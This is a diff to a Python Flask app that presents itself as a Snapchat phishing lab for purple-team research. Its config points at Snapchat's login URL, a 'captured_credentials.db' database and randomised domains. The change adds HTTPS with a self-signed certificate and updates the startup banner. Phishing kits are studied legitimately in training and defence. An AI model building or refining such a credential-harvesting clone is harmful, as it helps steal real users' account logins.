@@ -25,7 +25,7 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 CONFIG = {
     "SNAPCHAT_LOGIN_URL": "https://accounts.snapchat.com/login",
     "SERVER_PORT": 5000,
-    "USE_HTTPS": False,
+    "USE_HTTPS": True,
     "CAPTURE_DB": os.path.join(BASE_DIR, "captured_credentials.db"),
     "SESSION_TTL_MINUTES": 60,
     "RANDOMIZE_DOMAINS": True,
@@ -41,6 +41,15 @@ app = Flask(__name__, template_folder=os.path.join(BASE_DIR, "templates"), stati
 app.secret_key = secrets.token_hex(32)
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SECURE'] = CONFIG["USE_HTTPS"]
+
+# Verifier que cryptography est dispo pour le mode HTTPS
+if CONFIG["USE_HTTPS"]:
+    try:
+        import cryptography
+    except ImportError:
+        print("[!] cryptography non installe. HTTPS desactive.")
+        print("    pip install cryptography")
+        CONFIG["USE_HTTPS"] = False
 
 
 def init_database():
@@ -503,20 +512,20 @@ if __name__ == '__main__':
 ║   Cadre    Recherche ethique - Donnees anonymisees              ║
 ║   Interdit Toute utilisation non autorisee                      ║
 ╠══════════════════════════════════════════════════════════════════╣
-║   Page d'accueil           http://localhost:5000                ║
-║   Dashboard stats          http://localhost:5000/api/report     ║
-║   API consentement         http://localhost:5000/api/consent    ║
-║   Export anonymise         http://localhost:5000/export         ║
-║   Reset base               http://localhost:5000/reset          ║
-║   DB check                 http://localhost:5000/api/dbcheck    ║
+║   Page d'accueil           https://localhost:5000               ║
+║   Dashboard stats          https://localhost:5000/api/report    ║
+║   API consentement         https://localhost:5000/api/consent   ║
+║   Export anonymise         https://localhost:5000/export        ║
+║   Reset base               https://localhost:5000/reset         ║
+║   DB check                 https://localhost:5000/api/dbcheck   ║
 ╠══════════════════════════════════════════════════════════════════╣
-║  Lancement :   python generate.py   (clone Snapchat)            ║
 ║  Demarrer :    python main.py                                   ║
 ╚══════════════════════════════════════════════════════════════════╝
         """)
     except UnicodeEncodeError:
         print("SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique")
-        print(f"Server: http://localhost:{CONFIG['SERVER_PORT']}")
+        proto = "https" if CONFIG["USE_HTTPS"] else "http"
+        print(f"Server: {proto}://localhost:{CONFIG['SERVER_PORT']}")
     
     app.run(host='0.0.0.0', port=CONFIG["SERVER_PORT"], 
             ssl_context='adhoc' if CONFIG["USE_HTTPS"] else None,
